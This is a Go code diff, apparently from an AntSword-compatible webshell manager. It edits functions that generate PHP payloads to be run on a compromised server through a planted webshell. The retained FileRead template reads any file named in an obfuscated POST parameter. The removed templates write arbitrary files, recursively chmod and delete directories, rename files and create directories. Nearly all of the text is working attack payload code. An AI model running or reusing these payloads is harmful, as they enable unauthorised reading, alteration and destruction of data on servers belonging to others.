@@ -31,13 +31,10 @@ func randomVar6() string { return randomVar(6) }
 
 // 模板占位符（与 AntSword 语义一致）。
 const (
-	placeholderBase64Path    = "#{base64::path}"
-	placeholderBase64Bin     = "#{base64::bin}"
-	placeholderBase64Cmd     = "#{base64::cmd}"
-	placeholderBase64Env     = "#{base64::env}"
-	placeholderBase64Content = "#{base64::content}"
-	placeholderBase64Mode    = "#{base64::mode}"
-	placeholderBase64Name    = "#{base64::name}"
+	placeholderBase64Path = "#{base64::path}"
+	placeholderBase64Bin  = "#{base64::bin}"
+	placeholderBase64Cmd  = "#{base64::cmd}"
+	placeholderBase64Env  = "#{base64::env}"
 )
 
 // Info 返回把 OS / 运行时元数据打到 stdout 的 PHP 代码。
@@ -124,45 +121,6 @@ func (t *PHPTemplates) FileRead() (string, map[string]string) {
 	v := randomVar6()
 	code := "$F=base64_decode(substr($_POST[\"" + v + "\"],0));"
 	code += "$P=@fopen($F,\"r\");echo(@fread($P,filesize($F)?filesize($F):4096));@fclose($P);"
-	return code, map[string]string{v: placeholderBase64Path}
-}
-
-// FileWrite 返回一段 PHP 写文件代码。
-func (t *PHPTemplates) FileWrite() (string, map[string]string) {
-	v := [2]string{randomVar6(), randomVar6()}
-	code := "echo @fwrite(fopen(base64_decode(substr($_POST[\"" + v[0] + "\"],0)),\"w\"),base64_decode(substr($_POST[\"" + v[1] + "\"],0)))?\"1\":\"0\";"
-	return code, map[string]string{
-		v[0]: placeholderBase64Path,
-		v[1]: placeholderBase64Content,
-	}
-}
-
-// FileDelete 返回一段 PHP 删除文件 / 目录代码。
-func (t *PHPTemplates) FileDelete() (string, map[string]string) {
-	v := randomVar6()
-	code := "function df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p.\"/\".$f;if((is_dir($pf))&&($f!=\".\")&&($f!=\"..\")){@chmod($pf,0777);df($pf);}if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}}$m->close();@chmod($p,0777);return @rmdir($p);}"
-	code += "$F=base64_decode(substr($_POST[\"" + v + "\"],0));"
-	code += "if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?\"1\":\"0\":\"0\");}"
-	return code, map[string]string{v: placeholderBase64Path}
-}
-
-// FileRename 返回一段 PHP 重命名 / 移动代码。
-func (t *PHPTemplates) FileRename() (string, map[string]string) {
-	v := [2]string{randomVar6(), randomVar6()}
-	code := "$m=get_magic_quotes_gpc();"
-	code += "$src=base64_decode(substr($m?stripslashes($_POST[\"" + v[0] + "\"]):$_POST[\"" + v[0] + "\"],0));"
-	code += "$dst=base64_decode(substr($m?stripslashes($_POST[\"" + v[1] + "\"]):$_POST[\"" + v[1] + "\"],0));"
-	code += "echo(rename($src,$dst)?\"1\":\"0\");"
-	return code, map[string]string{
-		v[0]: placeholderBase64Path,
-		v[1]: placeholderBase64Name,
-	}
-}
-
-// FileMkdir 返回一段 PHP mkdir 代码。
-func (t *PHPTemplates) FileMkdir() (string, map[string]string) {
-	v := randomVar6()
-	code := "$f=base64_decode(substr($_POST[\"" + v + "\"],0));echo(mkdir($f)?\"1\":\"0\");"
 	return code, map[string]string{v: placeholderBase64Path}
 }
 
